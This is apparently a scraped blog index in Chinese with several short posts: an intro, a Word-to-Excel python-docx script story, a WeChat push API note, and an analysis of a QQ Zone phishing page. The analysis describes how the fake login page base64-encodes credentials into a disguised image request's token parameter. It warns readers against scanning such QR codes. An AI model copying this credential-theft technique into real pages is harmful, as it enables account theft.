IoT ESP8266（准备好好研究一波，可以单独列一列） 编程 Python 以及各种库 MATLAB 人工智能 AI 机器学习 Machine Learning，ML 计算机视觉 Computer Vision，CV 数据分析与挖掘 数据获取（如爬虫虫） 数据可视化 数据挖掘 微信小程序开发 前端尝个鲜 视频制作 etc. 其实就是啥都想玩一玩，感觉能做的就去尝试尝试，特别是那种接近实际的。于是乎就想写啥就写啥呗。不过基本上以小想法为主，就是随便记录一下这样吧。 好啦第一篇就这样随便写写了。溜啦溜啦~ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","path":"2019/07/09/FirstBlog/"},{"title":"小想法 | 某QQ空间盗号页面分析","text":"搬运自之前的小脑洞小想法啦 起因昨晚有个小伙伴空间里把列表都at了（后来知道的），附带P1这张图。 然后感觉不对劲，肯定是被盗号了。 然后突然有个脑洞，去看看这里面有啥吧 折腾记录用扫码工具（千万别拿QQ来扫，虽然这次的链接没啥大影响）得到二维码文字内容，发现是类似url.cn/...的短链接。 用电脑浏览器打开，同时打开调试窗口，发现短链接跳转到一个Github.io的页面（P3），很明显是GitHub Pages。 于是去GitHub上查找该用户，发现只有个项目，里面就只有一个index.html文件，对应着P2页面，最新版本还是昨天提交的（P4）。 感觉不对，于是改变 User Agent 为手机，重新访问短链接，跳转P5页面，是个伪QQ空间登录界面，果然是个钓鱼页面233。 点击一键登录，延时一会儿会提示 请安装最新版本QQ 。【忘了密码】及【注册新账号】都是跳转到QQ官方的页面。然后输个123456789啥的测试一下，还会提示 请输入正确账号或者密码 啥的（P6）。 乱输一个987321654，噫进去了，跳转到了真的QQ空间，虽然并没有真的登录（P7）。 而后在调试窗口network下找了半天，都没发现我提交的账号密码。（P8-9） 顺着remote address查，发现唯一有可能的就是那个user.jpg，还带token参数，隐藏得有点意思，虽然不知道为啥404了。 jio得还没完，这token咋来的，提交的账号密码去哪了emmm，缺点啥。然后查看网页元素，找到了对应的JavaScript代码（P10-11）。 哈哈哈哈哈这个逻辑判断写的还是有点意思的，还把一堆常用简单数字给处理了，难怪前面输123456789玩不来。这个一键登录就是个假的（万一真的估计就得不到账号密码了吧）。点击登录的时候，将用户名密码拼接成json字符串，然后将字符串转换成base64加密传输，而后跳转到官方QQ空间界面。将P9的token用base64解密，果然得到了账号密码（P12）。 // 他没调用官方登录接口，没有真的登录到QQ空间已经很友好了，不然更难发现呢 到这差不多了，但感觉还没完，我们再来查查这个域名吧。 P13-15注册者信息，这人注册的域名真多。 用邮箱查询，而后随便访问几个，P16发现都重定向到了一个相似页面，原来那是西部数码上的一个域名经销商。这么说那个人也只是从经销商那里买了个域名而已。 总结这是个做得有点水平的钓鱼网站。 碰到类似的二维码别乱扫，扫了也别登录！ 至于获取账号密码之后把全列表都at，估计还写了别的脚本或者调用了啥接口，这个我还不清楚emmm 以上内容均基于公开资料，仅供学习研究使用，请勿用于非法用途。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","path":"2019/03/30/Idea_AnalysisOfHackingPage/"},{"title":"小想法 | 利用python-docx批量提取Word中的信息进而导入Excel","text":"搬运自之前的小脑洞小想法啦 又是个小脑洞最近有个比赛要统计一下各组信息，信息来自Word版的申请表。 考虑到Word要一个一个打开，再复制粘贴。 简单重复，太难受了8，不如干脆py一下，写个小程序来弄吧。 大致思路一查发现.docx是以类似xml格式来存放信息的，刚开始思路就想直接解压.docx，从中解析文件然后暴力匹配。。 而后发现有个第三方库python-docx，于是乎不想造轮子了，直接拿来用吧。 然而并没有那么简单，合并的单元格变成独立重复的内容，加个去重吧。 提取信息文字都解析出来了，接下来，来点简单的正则匹配，单独拿个文件来试试，没毛病，挺好的。 批量读取遍历文件夹下所有文件，筛选.docx且排除临时文件，噫少了俩。 原来还有.doc格式的，另存为.docx (docx库只支持.docx)。 依次读取每个文件，拼接string列表，得到所需信息。 写入文件将infolist按照.csv的格式写入文件。 其实可以调用第三方库来实现的。 debug实际情况还是挺复杂的，比如表格哪里没填空缺了，或者哪个里面多加几个分隔符什么的，还是出了不少bug，于是继续完善程序，加入相应的处理呗！ 生产环境真复杂 如果用Excel打开.csv，发现学号前的0自动丢失，还是觉得不爽emmm （程序猿的自我修养 又查了查资料，新建.xlsx，从文本导入到Excel，设置好属性。 几好，完事！ 于是乎边查资料边debug边改代码 花了一个多两个小时估计几个人同时手动做早都做完了 （其实早就想过用py读取Excel了，但是一直还没试过，这次就先拿py读取Word试试水吧 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","path":"2019/03/21/Idea_python-docx/"},{"title":"小想法 | 基于PushBear API实现微信消息推送","text":"搬运自之前的小想法啦~ 调用API基于PushBear API实现微信消息提醒 PushBear API 用requests里现成的方法就完事了。 tkinter GUI就是直接写代码感觉有点不友好 于是想做个图形界面 基于Python GUI库tkinter简单做了一下 （代码手动写布局太难受了（还是直接用代码POST/GET方便emmm（突然jio得LabVIEW做图形界面真方便 微信推送效果 打开后是Markdown渲染的效果呢！ （完） 20191221 Update： 好久没用了不知道现在还能不能用了233 20200211 Update: ⚠️ 直发服务转代发的通知（重要）因多次被恶意举报，从2019年6月开始，只提供「已经微信认证后的服务号」进行授权后，用其自有接口权限代发。代发授权和绑定教程 最近弄微信消息提醒又来看了看，发现一对多的推送必须要绑定已认证的服务号才能使用了。 但是Server酱的给自己绑定的微信号推送消息还是有效的。 详见：https://sc.ftqq.com/ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","path":"2019/03/07/Idea_PushBearAPI_WeChatPush/"}]}